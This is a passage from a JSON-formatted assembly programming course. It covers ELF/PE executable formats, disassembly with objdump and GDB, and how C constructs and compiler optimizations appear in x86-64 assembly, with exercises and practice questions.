        "solutionExplanation": "Define symbols in .data and .text with global. After linking, nm program shows addresses and types. nm reports D for value and T for increment; readelf reports OBJECT and FUNC because NASM global declarations include type annotations. Compare addresses from your own linked file.",
        "solutionLanguage": "nasm"
      }
    ],
    "practiceQuestions": [
      {
        "question": "What is an executable format? Why are they standardized?",
        "answer": "A binary contract describing code, data, addresses and loader/linker metadata. Standardization lets compatible assemblers, linkers, debuggers and loaders exchange files; architecture and ABI compatibility are still required."
      },
      {
        "question": "Name the three main types of ELF files and explain their purposes.",
        "answer": "ET_REL holds linkable objects, ET_EXEC holds executable images, and ET_DYN holds shared objects or PIE executables. ET_CORE is a fourth category containing process-state snapshots."
      },
      {
        "question": "What is the difference between a section and a segment in ELF?",
        "answer": "Sections organize material for linking and analysis; segments describe runtime mappings. One PT_LOAD can include several sections. Execution can work without a section header table."
      },
      {
        "question": "How does dynamic linking work in ELF? Explain the roles of GOT and PLT.",
        "answer": "The interpreter reads dynamic metadata, loads dependencies and applies relocations. GOT entries contain resolved addresses; PLT stubs dispatch indirect function calls. Lazy resolution is optional, and eager binding can fill slots before execution."
      },
      {
        "question": "What is the purpose of the DOS header in a PE file?",
        "answer": "The MZ header preserves DOS compatibility and its e_lfanew field at file offset 0x3C locates the PE signature. The following DOS stub is separate from native Windows code."
      },
      {
        "question": "Describe the structure of a PE file. What are the major components?",
        "answer": "DOS header and stub, PE signature, COFF file header, optional header, section table, then section data and associated directories. Bounds and optional-header magic must be checked before reading fields."
      },
      {
        "question": "How are imports and exports handled in PE? What are the IAT and EAT?",
        "answer": "Import descriptors identify DLLs and imported names/ordinals; the loader writes resolved addresses to the IAT. The export address table contains exported RVAs, with name/ordinal mappings and possible forwarders."
      },
      {
        "question": "Compare ELF and PE in terms of entry point specification and dynamic linking.",
        "answer": "ELF e_entry is a link-time virtual address; PIE adds its load bias. PE AddressOfEntryPoint is an RVA added to the actual image base. ELF uses dynamic metadata and often GOT/PLT; PE uses import descriptors and the IAT."
      },
      {
        "question": "What is a relocation? Why are relocations needed?",
        "answer": "A relocation describes an address-dependent fixup. Linkers or loaders apply it when symbol placement or load addresses become known. PC-relative references may avoid some runtime fixups but not every relocation."
      },
      {
        "question": "How can you determine the entry point of an ELF executable using readelf? For a PE using objdump?",
        "answer": "Use readelf -h file and read Entry point address. For PE use objdump -x file.exe and inspect AddressOfEntryPoint and ImageBase; add the RVA to the actual load base for a runtime VA."
      }
    ],
    "summary": [
      "Executable formats define how code and data are organized for loading and execution.",
      "ELF is the standard on Linux; it consists of an ELF header, program headers (segments), section headers, and sections.",
      "ELF supports relocatable objects, executables, shared libraries, and core dumps.",
      "Dynamic linking uses the GOT and PLT, with the dynamic linker resolving symbols at runtime.",
      "PE is the Windows format, with DOS headers, PE header, optional header, sections, and import/export tables.",
      "Tools like readelf, objdump, nm, ldd help analyze ELF files; dumpbin and PE viewers for PE.",
      "Understanding executable formats is foundational for reverse engineering, malware analysis, and systems programming.",
      "In the next chapter, we'll learn to disassemble and read compiler-generated assembly, applying this knowledge to understand optimized binaries."
    ]
  },
  {
    "id": 24,
    "slug": "chapter-24-disassembly-reading-compiler-assembly",
    "level": 5,
    "levelTitle": "Low-Level Systems and Reverse Engineering",
    "title": "Chapter 24: Disassembly and Reading Compiler-Generated Assembly",
    "subtitle": "Decoding C Constructs: If-Else, Loops, Switch Tables, and Optimizations",
    "learningObjectives": [
      "Understand the role of disassembly in analyzing binary executables and object files.",
      "Master tools for disassembling: objdump, gdb disassemble, ndisasm, and llvm-objdump.",
      "Learn to read and interpret compiler-generated assembly from C/C++ code at various optimization levels.",
      "Recognize common assembly patterns for functions, loops, conditionals, switch statements, and data structures.",
      "Identify stack frame setup and teardown, parameter passing, and return value handling according to the ABI.",
      "Understand how compiler optimizations transform source code: inlining, loop unrolling, vectorization, and tail-call elimination.",
      "Apply this knowledge to reverse engineering and debugging tasks."
    ],
    "prerequisites": [
      "Solid understanding of x86-64 assembly, registers, addressing modes, and instructions (Chapters 1–13).",
      "Familiarity with the build process, object files, and executable formats (Chapters 4, 23).",
      "Knowledge of calling conventions and stack frames (Chapter 10).",
      "Basic C programming experience.",
      "Ability to use command-line tools like gcc, objdump, and gdb (Chapters 4, 17)."
    ],
    "keyConcepts": [
      "Disassembly is the process of converting machine code back into assembly language.",
      "Compiler-generated assembly reflects the compiler’s implementation of high-level constructs, often with optimizations.",
      "Optimization levels (-O0, -O1, -O2, -O3, -Os, -Og) trade off speed, size, and debuggability.",
      "Prologue and epilogue set up and tear down the stack frame; may be omitted in leaf functions or with frame pointer omission.",
      "Function calls follow the ABI: arguments in registers (first six), return in rax.",
      "Loops are implemented with conditional jumps; compilers may unroll or vectorize.",
      "Switch statements may use jump tables or decision trees.",
      "Arrays and structs are accessed via base+offset addressing.",
      "Tail calls may be optimized into jumps.",
      "Debug symbols (-g) greatly aid disassembly by providing names and source line mappings."
    ],
    "diagramType": "disassembly_analysis",
    "sections": [
      {
        "id": "sec-24-1",
        "title": "24.1 Introduction to Disassembly",
        "content": "Disassembly is the reverse of assembly: it translates raw machine code into human-readable assembly instructions. While high-level decompilation aims to recover C-like code, disassembly works at the instruction level and is essential for understanding compiler output, reverse engineering, and debugging.\n\nWhy read compiler-generated assembly?\n- To verify what the compiler did and identify inefficiencies.\n- To debug optimized code where source-level debugging is difficult.\n- To reverse engineer proprietary or malware binaries.\n- To learn optimization techniques used by compilers.\n\nDisassemblers rely on binary analysis and may struggle with variable-length x86 instructions, indirect jumps, and data embedded in code. However, with proper symbols and section information, disassembly is usually straightforward."
      },
      {
        "id": "sec-24-2",
        "title": "24.2 Tools for Disassembly",
        "content": ""
      },
      {
        "id": "sec-24-2-1",
        "title": "24.2.1 objdump",
        "content": "The most common Linux disassembler. For Intel syntax (preferred):",
        "codeSnippets": [
          {
            "language": "bash",
            "title": "24.2.1 objdump — listing 1",
            "code": "objdump -d -M intel ./program",
            "explanation": "Options:\n- -d: disassemble executable sections.\n- -D: disassemble all sections (including data, sometimes producing garbage if data is interpreted as code).\n- -M intel: use Intel syntax.\n- -S: intermix source lines if debug info available.\n- --start-address=, --stop-address=: limit range."
          }
        ]
      },
      {
        "id": "sec-24-2-2",
        "title": "24.2.2 GDB Disassemble",
        "content": "Inside GDB:\n\nClarification: Prefer disassemble /s for source mixed with assembly; /m is deprecated and can omit instructions after optimization. Use set disassembly-flavor intel and disassemble /r for bytes. Reference: https://sourceware.org/gdb/current/onlinedocs/gdb.html/Machine-Code.html",
        "codeSnippets": [
          {
            "language": "gdb",
            "title": "24.2.2 GDB Disassemble — listing 1",
            "code": "disassemble /m function_name\ndisassemble 0x400080, 0x4000a0",
            "explanation": "The /m option shows source lines mixed with assembly if debug info present."
          }
        ]
      },
      {
        "id": "sec-24-2-3",
        "title": "24.2.3 ndisasm",
        "content": "The NASM disassembler, useful for raw binary blobs:\n\nClarification: ndisasm does not interpret ELF sections or relocations. Extract a known code region first, select the correct bitness and supply its origin with -o when useful.",
        "codeSnippets": [
          {
            "language": "bash",
            "title": "24.2.3 ndisasm — listing 1",
            "code": "ndisasm -b64 file.bin"
          }
        ]
      },
      {
        "id": "sec-24-2-4",
        "title": "24.2.4 llvm-objdump",
        "content": "Similar to GNU objdump, part of LLVM toolchain:",
        "codeSnippets": [
          {
            "language": "bash",
            "title": "24.2.4 llvm-objdump — listing 1",
            "code": "llvm-objdump -d -M intel ./program"
          }
        ]
      },
      {
        "id": "sec-24-3",
        "title": "24.3 Compiler Optimization Levels",
        "content": "GCC offers various optimization levels that dramatically affect generated assembly.\n\n\n\nWe'll examine examples at -O0 and -O2 to see the difference.\n\nClarification: Exact enabled passes depend on compiler version and target. Current GCC documents loop and SLP vectorization at -O2 with a very-cheap cost model; -O3 uses a more permissive model. A flag enables an opportunity, not a guaranteed transformation. Inspect gcc -Q -O2 --help=optimizers. Reference: https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html",
        "tableData": {
          "headers": [
            "Flag",
            "Description"
          ],
          "rows": [
            [
              "-O0",
              "No optimization; code is straightforward, with many stack accesses. Good for debugging."
            ],
            [
              "-O1",
              "Basic optimizations: constant folding, dead code elimination, some inlining."
            ],
            [
              "-O2",
              "More aggressive: instruction scheduling, loop unrolling, vectorization (with -ftree-vectorize enabled by default at -O2 for some targets?), but not always."
            ],
            [
              "-O3",
              "Aggressive: more inlining, loop unrolling, function cloning, and vectorization."
            ],
            [
              "-Os",
              "Optimize for size: similar to -O2 but avoids code bloat."
            ],
            [
              "-Og",
              "Optimize for debugging: enables optimizations that do not interfere with debug experience."
            ]
          ]
        }
      },
      {
        "id": "sec-24-3-1",
        "title": "24.3.1 Example: Simple Function at Different Optimization Levels",
        "content": "C code:",
        "codeSnippets": [
          {
            "language": "c",
            "title": "24.3.1 Example: Simple Function at Different Optimization Levels — listing 1",
            "code": "int add(int a, int b) {\n    return a + b;\n}",
            "explanation": "Compile with -S -masm=intel to see assembly:\n\nAt -O0:"
          },
          {
            "language": "text",
            "title": "24.3.1 Example: Simple Function at Different Optimization Levels — listing 2 (illustrative compiler assembly)",
            "code": "add:\n    push    rbp\n    mov     rbp, rsp\n    mov     DWORD PTR [rbp-4], edi\n    mov     DWORD PTR [rbp-8], esi\n    mov     edx, DWORD PTR [rbp-4]\n    mov     eax, DWORD PTR [rbp-8]\n    add     eax, edx\n    pop     rbp\n    ret",
            "explanation": "At -O0, the compiler stores arguments to stack, reloads them, and uses eax for sum. No optimization.\n\nAt -O2:"
          },
          {
            "language": "text",
            "title": "24.3.1 Example: Simple Function at Different Optimization Levels — listing 3 (illustrative compiler assembly)",
            "code": "add:\n    lea     eax, [rdi+rsi]\n    ret",
            "explanation": "The function simply uses lea to compute sum and returns. No stack frame needed.\n\nThis shows how optimization removes redundant memory operations."
          }
        ]
      },
      {
        "id": "sec-24-3-2",
        "title": "24.3.2 Impact on Function Prologue/Epilogue",
        "content": "- At -O0, almost every function uses push rbp; mov rbp, rsp; ...; pop rbp; ret to establish a frame pointer, making stack accesses clear.\n- At -O2, many functions omit the frame pointer (-fomit-frame-pointer is default at -O1 and higher for x86-64), using rsp-relative addressing or not touching the stack at all if no locals."
      },
      {
        "id": "sec-24-4",
        "title": "24.4 Reading Compiler-Generated Assembly: Function Calls",
        "content": "Understanding how compilers translate function calls is fundamental."
      },
      {
        "id": "sec-24-4-1",
        "title": "24.4.1 Calling a Simple Function",
        "content": "C code:\n\nClarification: The shown out-of-line call is illustrative; the supplied tiny function is commonly inlined at -O2. Put foo in a separate translation unit and disable LTO to inspect the call reliably. Some compiler analyses also avoid unnecessary stack adjustments for known callees.",
        "codeSnippets": [
          {
            "language": "c",
            "title": "24.4.1 Calling a Simple Function — listing 1",
            "code": "int foo(int x) { return x * 2; }\nint bar(int a) {\n    int b = foo(a);\n    return b + 1;\n}",
            "explanation": "Assembly at -O2 (Intel syntax):"
          },
          {
            "language": "text",
            "title": "24.4.1 Calling a Simple Function — listing 2 (illustrative compiler assembly)",
            "code": "foo:\n    lea     eax, [rdi+rdi]      ; x*2\n    ret\n\nbar:\n    sub     rsp, 8              ; align stack? (actually to maintain alignment for call)\n    call    foo                 ; rdi still holds a\n    add     eax, 1\n    add     rsp, 8\n    ret",
            "explanation": "Here foo is inlined? Not necessarily; -O2 may inline small functions, but if not inlined, the call is present. Observe:\n- rdi is passed unchanged to foo.\n- After call, result in eax, then add 1.\n- Note the sub rsp, 8 before call to keep stack 16-byte aligned (since at function entry, rsp is 8 mod 16, and call pushes 8 bytes, so after sub rsp,8, rsp is 0 mod 16 before call). Good."
          }
        ]
      },
      {
        "id": "sec-24-4-2",
        "title": "24.4.2 Passing Arguments",
        "content": "First six integer args in rdi, rsi, rdx, rcx, r8, r9. Additional args on stack.\n\nExample:\n\nClarification: These are System V AMD64 integer/pointer rules, not universal first-six rules. Read the seventh argument at RSP+8 only before stack changes; with push rbp / mov rbp,rsp it is at RBP+16.",
        "codeSnippets": [
          {
            "language": "c",
            "title": "24.4.2 Passing Arguments — listing 1",
            "code": "int many_args(int a, int b, int c, int d, int e, int f, int g) {\n    return a+b+c+d+e+f+g;\n}",
            "explanation": "At -O2, g is on stack at [rsp+8] after prologue? Actually at function entry, 7th arg is at [rsp+8] (since return address at [rsp]). The compiler may use mov eax, [rsp+8] to load it."
          }
        ]
      },
      {
        "id": "sec-24-4-3",
        "title": "24.4.3 Returning Values",
        "content": "Integers/pointers returned in eax/rax. Floating-point in xmm0. Large structs may use hidden pointer."
      },
      {
        "id": "sec-24-5",
        "title": "24.5 Control Flow Patterns",
        "content": ""
      },
      {
        "id": "sec-24-5-1",
        "title": "24.5.1 If-Else",
        "content": "C:",
        "codeSnippets": [
          {
            "language": "c",
            "title": "24.5.1 If-Else — listing 1",
            "code": "int max(int a, int b) {\n    if (a > b)\n        return a;\n    else\n        return b;\n}",
            "explanation": "At -O2:"
          },
          {
            "language": "text",
            "title": "24.5.1 If-Else — listing 2 (illustrative compiler assembly)",
            "code": "max:\n    cmp     edi, esi\n    jle     .L2\n    mov     eax, edi\n    ret\n.L2:\n    mov     eax, esi\n    ret",
            "explanation": "Or using cmovg if profitable:"
          },
          {
            "language": "text",
            "title": "24.5.1 If-Else — listing 3 (illustrative compiler assembly)",
            "code": "max:\n    cmp     edi, esi\n    mov     eax, esi\n    cmovg   eax, edi\n    ret",
            "explanation": "The compiler may choose branchless version for unpredictable branches."
          }
        ]
      },
      {
        "id": "sec-24-5-2",
        "title": "24.5.2 Loops",
        "content": "C:\n\nClarification: Signed overflow in C is undefined. Use a bounded positive n for this demonstration; the original loop also overflows its induction variable at INT_MAX. The displayed instructions illustrate a possible pattern, not a promised gcc output.",
        "codeSnippets": [
          {
            "language": "c",
            "title": "24.5.2 Loops — listing 1",
            "code": "int sum(int n) {\n    int s = 0;\n    for (int i = 1; i <= n; i++)\n        s += i;\n    return s;\n}",
            "explanation": "At -O2, the loop may be optimized into a closed-form formula (arithmetic progression) or kept as loop. If kept:"
          },
          {
            "language": "text",
            "title": "24.5.2 Loops — listing 2 (illustrative compiler assembly)",
            "code": "sum:\n    xor     eax, eax\n    test    edi, edi\n    jle     .L2\n    mov     ecx, 1\n.L3:\n    add     eax, ecx\n    inc     ecx\n    cmp     ecx, edi\n    jle     .L3\n.L2:\n    ret",
            "explanation": "Or with unrolling. Compilers often use induction variable optimization."
          }
        ]
      },
      {
        "id": "sec-24-5-3",
        "title": "24.5.3 Switch Statements",
        "content": "Switch statements can be compiled to:\n- Jump table (dense case values): a table of code addresses, indexed by the switch expression.\n- Decision tree (sparse values): a series of comparisons and jumps.\n\nExample jump table:\n\nClarification: The listing mixes compiler/GAS directives with explanatory semicolon comments; it is not a complete NASM program. PIC jump tables often contain signed 32-bit offsets added to a table base. Returning 10,20,30,40 may become arithmetic without any table.",
        "codeSnippets": [
          {
            "language": "text",
            "title": "24.5.3 Switch Statements — listing 1 (illustrative compiler assembly)",
            "code": "    mov     eax, edi\n    cmp     eax, 3\n    ja      .Ldefault\n    lea     rdx, [.L4]\n    mov     rax, [rdx + rax*8]\n    jmp     rax\n.L4:\n    .quad   .Lcase0\n    .quad   .Lcase1\n    .quad   .Lcase2\n    .quad   .Lcase3"
          }
        ]
      },
      {
        "id": "sec-24-6",
        "title": "24.6 Data Structures and Access",
        "content": ""
      },
      {
        "id": "sec-24-6-1",
        "title": "24.6.1 Arrays",
        "content": "Array access uses scaled indexed addressing.\n\nC:",
        "codeSnippets": [
          {
            "language": "c",
            "title": "24.6.1 Arrays — listing 1",
            "code": "int get(int *arr, int i) {\n    return arr[i];\n}",
            "explanation": "At -O2:"
          },
          {
            "language": "text",
            "title": "24.6.1 Arrays — listing 2 (illustrative compiler assembly)",
            "code": "get:\n    movsxd  rax, esi        ; sign-extend i\n    mov     eax, [rdi + rax*4]\n    ret",
            "explanation": "Notice movsxd to sign-extend 32-bit int to 64-bit for address calculation."
          }
        ]
      },
      {
        "id": "sec-24-6-2",
        "title": "24.6.2 Structures",
        "content": "Structure members accessed via base+offset.\n\nC:",
        "codeSnippets": [
          {
            "language": "c",
            "title": "24.6.2 Structures — listing 1",
            "code": "struct Point { int x; int y; };\nint get_x(struct Point *p) { return p->x; }",
            "explanation": "At -O2:"
          },
          {
            "language": "text",
            "title": "24.6.2 Structures — listing 2 (illustrative compiler assembly)",
            "code": "get_x:\n    mov     eax, [rdi]      ; offset 0\n    ret",
            "explanation": "If get_y:"
          },
          {
            "language": "text",
            "title": "24.6.2 Structures — listing 3 (illustrative compiler assembly)",
            "code": "get_y:\n    mov     eax, [rdi+4]\n    ret"
          }
        ]
      },
      {
        "id": "sec-24-6-3",
        "title": "24.6.3 Linked Lists / Pointer Chasing",
        "content": "C:\n\nClarification: The source snippet omits the Node definition and uses an unnecessary int pointer cast. The typed example below supplies the layout. Both node and node->next must point to valid objects.",
        "codeSnippets": [
          {
            "language": "c",
            "title": "24.6.3 Linked Lists / Pointer Chasing — listing 1",
            "code": "int get_next_value(int *node) {\n    return ((struct Node*)node)->next->value;\n}",
            "explanation": "Assembly involves multiple dereferences."
          },
          {
            "language": "c",
            "title": "Complete typed pointer-chasing example",
            "code": "struct Node { int value; struct Node *next; };\nint get_next_value(struct Node *node) { return node->next->value; }",
            "explanation": "On typical SysV x86-64, next is at offset 8 and value at offset 0. Inspect generated assembly rather than assuming this for every ABI."
          }
        ]
      },
      {
        "id": "sec-24-7",
        "title": "24.7 Compiler Optimizations in Assembly",
        "content": ""
      },
      {
        "id": "sec-24-7-1",
        "title": "24.7.1 Inlining",
        "content": "Small functions may be inlined into callers, eliminating call overhead.\n\nBefore inlining:",
        "codeSnippets": [
          {
            "language": "text",
            "title": "24.7.1 Inlining — listing 1 (illustrative compiler assembly)",
            "code": "call foo",
            "explanation": "After inlining, the body of foo appears directly."
          }
        ]
      },
      {
        "id": "sec-24-7-2",
        "title": "24.7.2 Tail Call Optimization",
        "content": "If a function call is the last operation before return, the compiler may replace call/ret with jmp.\n\nC:",
        "codeSnippets": [
          {
            "language": "c",
            "title": "24.7.2 Tail Call Optimization — listing 1",
            "code": "int f(int x) { return g(x); }",
            "explanation": "At -O2:"
          },
          {
            "language": "text",
            "title": "24.7.2 Tail Call Optimization — listing 2 (illustrative compiler assembly)",
            "code": "f:\n    jmp     g       ; tail call"
          },
          {
            "language": "nasm",
            "title": "Original source: Solution 24.4",
            "code": "int g(int x) { return x*2; }\nint f(int x) { return g(x); }",
            "explanation": "Original source solution: g can be inlined, so -O2 does not guarantee jmp g. See the exercise for a separate-translation-unit experiment."
          }
        ]
      },
      {
        "id": "sec-24-7-3",
        "title": "24.7.3 Loop Unrolling and Vectorization",
        "content": "Compilers may unroll loops to reduce branch overhead or use SSE/AVX to process multiple elements.\n\nExample: sum of array may be vectorized to use addps or paddd.\n\nClarification: Floating-point reduction order affects rounding. Reassociation for vectorized floating sums may require relaxed math flags; packed integer sums have different constraints."
      },
      {
        "id": "sec-24-7-4",
        "title": "24.7.4 Strength Reduction",
        "content": "Replace multiplication by constant with shifts/adds."
      },
      {
        "id": "sec-24-7-5",
        "title": "24.7.5 Constant Folding",
        "content": "Expressions with constants are evaluated at compile time."
      },
      {
        "id": "sec-24-8",
        "title": "24.8 Reading Optimized vs Unoptimized Code",
        "content": "Understanding optimization level helps set expectations.\n\nClarification: The comparison describes tendencies, not guarantees: -O0 need not preserve every call or always use RBP, and optimized code can grow through inlining and unrolling.",
        "tableData": {
          "headers": [
            "Feature",
            "-O0",
            "-O2"
          ],
          "rows": [
            [
              "Stack frame",
              "Always uses rbp",
              "Often omits rbp"
            ],
            [
              "Variable storage",
              "Many stack spills",
              "Mostly registers"
            ],
            [
              "Branches",
              "Direct translation",
              "May use conditional moves"
            ],
            [
              "Loops",
              "Simple, unoptimized",
              "Possibly unrolled/vectorized"
            ],
            [
              "Function calls",
              "Always call",
              "May inline or tail-call"
            ],
            [
              "Code size",
              "Larger, simpler",
              "Smaller/faster, harder to read"
            ]
          ]
        }
      },
      {
        "id": "sec-24-9",
        "title": "24.9 Practical Examples",
        "content": ""
      },
      {
        "id": "sec-24-9-1",
        "title": "24.9.1 Disassemble a Simple Program",
        "content": "Create hello.c:\n\nClarification: GCC can replace printf with puts for this fixed string even at -O0. To preserve printf for this inspection, use -fno-builtin-printf. Use objdump -d -M intel --disassemble=main hello to isolate main.",
        "codeSnippets": [
          {
            "language": "c",
            "title": "24.9.1 Disassemble a Simple Program — listing 1",
            "code": "#include <stdio.h>\nint main() {\n    printf(\"Hello, World!\\n\");\n    return 0;\n}",
            "explanation": "Compile with symbols and no optimization:"
          },
          {
            "language": "bash",
            "title": "24.9.1 Disassemble a Simple Program — listing 2",
            "code": "gcc -O0 -g hello.c -o hello",
            "explanation": "Disassemble:"
          },
          {
            "language": "bash",
            "title": "24.9.1 Disassemble a Simple Program — listing 3",
            "code": "objdump -d -M intel hello | grep -A20 '<main>:'",
            "explanation": "Observe prologue, call to printf via PLT, and epilogue."
          }
        ]
      },
      {
        "id": "sec-24-9-2",
        "title": "24.9.2 Analyze a Function with GDB",
        "content": "Load binary in GDB, break at function, disassemble:\n\nClarification: Run gdb ./hello at the shell, then enter the remaining commands inside GDB. Use disassemble /s main for current source-mixed output.",
        "codeSnippets": [
          {
            "language": "gdb",
            "title": "24.9.2 Analyze a Function with GDB — listing 1",
            "code": "gdb ./hello\nbreak main\nrun\ndisassemble /m\nstepi\ninfo registers"
          }
        ]
      }
    ],
    "exercises": [
      {
        "id": "ex-24-1",
        "title": "Exercise 24.1: Disassemble and Identify",
        "description": "Write a C function that swaps two integers using a temporary variable. Compile with -O0 and -O2, disassemble, and explain the differences.",
        "solution": "void swap(int *a, int *b) {\n    int tmp = *a;\n    *a = *b;\n    *b = tmp;\n}",
        "solutionLanguage": "c",
        "solutionExplanation": "C code:\n\n-O0: uses stack for tmp, loads/stores.\n-O2: uses registers, no stack. Save this C listing as exercise.c; compile with gcc -O0 -g -c exercise.c -o exercise-O0.o and gcc -O2 -g -c exercise.c -o exercise-O2.o, then compare objdump -dr -M intel on both objects."
      },
      {
        "id": "ex-24-2",
        "title": "Exercise 24.2: Recognize Loop Pattern",
        "description": "Write a C function that sums elements of an array of 100 ints. Compile with -O2. Identify loop induction variable, loop exit condition, and any vectorization.",
        "solution": "int sum(int *arr, int n) {\n    int s = 0;\n    for (int i=0; i<n; i++) s += arr[i];\n    return s;\n}",
        "solutionLanguage": "c",
        "solutionExplanation": "C code:\n\n-O2 may use lea and add with pointer increments, or vectorized. Save this C listing as exercise.c; compile with gcc -O0 -g -c exercise.c -o exercise-O0.o and gcc -O2 -g -c exercise.c -o exercise-O2.o, then compare objdump -dr -M intel on both objects. Call sum with n=100 and a valid 100-element array. Test values 0..99, whose sum is 4950. Use -fopt-info-vec-all to inspect vectorization decisions; identify scalar cleanup as well as the main loop."
      },
      {
        "id": "ex-24-3",
        "title": "Exercise 24.3: Switch Statement",
        "description": "Write a C function with a switch statement on an integer 0-3 returning different values. Compile with -O2. Determine if a jump table is used. Show the table entries.",
        "solution": "int f(int x) {\n    switch(x) {\n        case 0: return 10;\n        case 1: return 20;\n        case 2: return 30;\n        case 3: return 40;\n    }\n    return -1;\n}",
        "solutionLanguage": "c",
        "solutionExplanation": "C code:\n\nCompile -O2, look for jump table. Save this C listing as exercise.c; compile with gcc -O0 -g -c exercise.c -o exercise-O0.o and gcc -O2 -g -c exercise.c -o exercise-O2.o, then compare objdump -dr -M intel on both objects. The linear return values usually become 10*(x+1), guarded by an unsigned range test, so there may be no table entries to show. Inspect objdump -s -j .rodata only if that section exists; a constants table is distinct from a control-flow jump table."
      },
      {
        "id": "ex-24-4",
        "title": "Exercise 24.4: Tail Call",
        "description": "Write two C functions where one tail-calls the other. Compile with -O2 and verify that the call is replaced by a jump.",
        "solution": "# Save and run as a shell script in an exercise directory.\ncat > g.c <<'C'\nint g(int x) { return x*2; }\nC\ncat > f.c <<'C'\nextern int g(int);\nint f(int x) { return g(x); }\nC\ngcc -O2 -fno-lto -c f.c -o f.o\ngcc -O2 -fno-lto -c g.c -o g.o\nobjdump -dr -M intel f.o\n# Compare with a build where sibling-call optimization is disabled:\ngcc -O2 -fno-lto -fno-optimize-sibling-calls -c f.c -o f-call.o\nobjdump -dr -M intel f-call.o",
        "solutionLanguage": "bash",
        "solutionExplanation": "-O2: f becomes jmp g. Save this C listing as exercise.c; compile with gcc -O0 -g -c exercise.c -o exercise-O0.o and gcc -O2 -g -c exercise.c -o exercise-O2.o, then compare objdump -dr -M intel on both objects. Run the shell commands above. An external g prevents local inlining without LTO; look for a tail jmp plus relocation in f.o and call/ret in f-call.o."
      },
      {
        "id": "ex-24-5",
        "title": "Exercise 24.5: Struct Access",
        "description": "Define a struct with three fields, write a function that returns the third field. Disassemble and show the offset used.",
        "solution": "struct S { int a; char b; long c; };\nlong get_c(struct S *s) { return s->c; }",
        "solutionLanguage": "c",
        "solutionExplanation": "Offset for c likely 8 or 16 depending on alignment. Disassemble and observe [rdi+8] or [rdi+16]. Save this C listing as exercise.c; compile with gcc -O0 -g -c exercise.c -o exercise-O0.o and gcc -O2 -g -c exercise.c -o exercise-O2.o, then compare objdump -dr -M intel on both objects. Under the chapter’s SysV AMD64 LP64 ABI, c is at offset 8: int occupies 0–3, char occupies 4, padding occupies 5–7, long occupies 8–15. Check with offsetof(struct S,c); offset 16 is not the default for this definition."
      }
    ],
    "practiceQuestions": [
      {
        "question": "What is disassembly? How does it differ from decompilation?",
        "answer": "Disassembly decodes machine instructions into mnemonics and operands. Decompilation infers higher-level constructs; neither generally recovers original variable names, comments or exact source without debug information."
      },
      {
        "question": "Which tool would you use to disassemble an ELF binary with Intel syntax?",
        "answer": "objdump -d -M intel program disassembles executable sections of an ELF binary. Add -S for available debug source mappings, or --disassemble=function to focus the output."
      },
      {
        "question": "What are the typical prologue and epilogue instructions for a function with a frame pointer? How does -O2 change this?",
        "answer": "Common setup is push rbp; mov rbp,rsp; sub rsp,N. Teardown is mov rsp,rbp; pop rbp; ret, often expressed as leave; ret. Optimization may omit the frame pointer or the whole frame."
      },
      {
        "question": "How are function arguments passed according to the System V AMD64 ABI? Where are additional arguments beyond six passed?",
        "answer": "For ordinary integer/pointer arguments, RDI, RSI, RDX, RCX, R8 and R9 are used; later arguments use the stack. At an unmodified entry, the seventh integer argument is at RSP+8. Floating arguments use XMM registers; aggregates follow ABI classification."
      },
      {
        "question": "How can you identify a switch statement that uses a jump table in assembly? Show an example.",
        "answer": "A bounds check precedes an indexed load and indirect jump, for example cmp edi,3; ja default; lea rdx,[rel table]; movsxd rax,dword [rdx+rdi*4]; add rax,rdx; jmp rax. This assumes EDI has been zero-extended. The entries here are signed relative code offsets. A table whose loaded value is returned directly is a value table, not a jump table."
      },
      {
        "question": "What is tail call optimization? How does it appear in assembly?",
        "answer": "A eligible final call can reuse the caller return address after restoring its frame, using jmp target. Inlining may eliminate the call entirely, so use separate translation units without LTO to observe a tail jump."
      },
      {
        "question": "How does a compiler typically implement a loop? What are induction variables?",
        "answer": "Look for initialization, a condition, a back edge, and an update. An induction variable changes predictably each iteration, such as an index incrementing by one or a pointer advancing by four bytes. Vector loops may advance by several elements."
      },
      {
        "question": "In optimized code, why might a function not use a frame pointer? What are the trade-offs?",
        "answer": "Omitting RBP saves setup/teardown instructions and makes another register available. Stack offsets may change with RSP, making manual analysis harder; unwind metadata can still support stack traces."
      },
      {
        "question": "How can you tell if an array is being accessed? What addressing mode is used?",
        "answer": "An address such as [rdi+rax*4] suggests four-byte elements, while [rdi+rax*8] suggests eight-byte elements. Track base and index origins: scaled addressing alone does not prove an array or its bounds."
      },
      {
        "question": "Why is it important to know the optimization level when analyzing assembly?",
        "answer": "Optimization can remove variables, fold arithmetic, reorder instructions, inline calls and transform loops. Knowing flags and compiler version helps avoid treating illustrative patterns as guaranteed instruction sequences."
      }
    ],
    "summary": [
      "Disassembly converts machine code to assembly; tools like objdump and GDB are essential.",
      "Compiler-generated assembly varies with optimization level; -O0 is simple but verbose, -O2 is optimized and often uses registers, omits frame pointer, and may inline functions.",
      "Recognize patterns: prologues/epilogues, function calls, loops, switches, array/struct access.",
      "Tail calls become jumps; loops may be unrolled/vectorized.",
      "Understanding ABI and optimization levels is crucial for reading compiler output.",
      "Practice by compiling small snippets and analyzing.",
      "In the next chapter, we’ll delve into stack frames, prologues, and epilogues in more detail."
    ]
  },
  {
    "id": 25,
    "slug": "chapter-25-stack-frames-prologues-epilogues",
    "level": 5,
    "levelTitle": "Low-Level Systems and Reverse Engineering",
    "title": "Chapter 25: Stack Frames, Prologues, and Epilogues",
    "subtitle": "Standard Frames, Frame Pointer Omission (FPO), Alloca, and Red Zone",
    "learningObjectives": [
      "Understand the purpose and structure of stack frames in function calls.",
      "Master the standard prologue and epilogue with a frame pointer (rbp).",
      "Recognize optimized variants: frame pointer omission, leaf functions, and red zone usage.",
      "Analyze how functions with more than six arguments and local variables are laid out on the stack.",
      "Read and interpret compiler-generated stack frames in disassembly.",
      "Handle special cases like variable-length arrays and alloca.",
      "Write assembly functions with correct stack management and alignment."
    ],
    "prerequisites": [
      "Solid understanding of the stack, rsp, and rbp (Chapter 3).",
      "Familiarity with calling conventions and procedures (Chapter 10).",
      "Knowledge of ABI details and register allocation (Chapter 19).",
      "Experience reading disassembly (Chapter 24).",
      "Basic understanding of compiler optimizations (Chapter 24)."
    ],
    "keyConcepts": [
      "A stack frame is the region of the stack dedicated to a single function invocation.",
      "The prologue sets up the frame; the epilogue tears it down.",
      "Using a frame pointer (rbp) provides stable access to arguments and locals even if rsp changes.",
      "Frame pointer omission frees rbp for general use but complicates stack access.",
      "Leaf functions can use the red zone (128 bytes below rsp) without adjusting rsp.",
      "Stack alignment must be maintained (16-byte before call).",
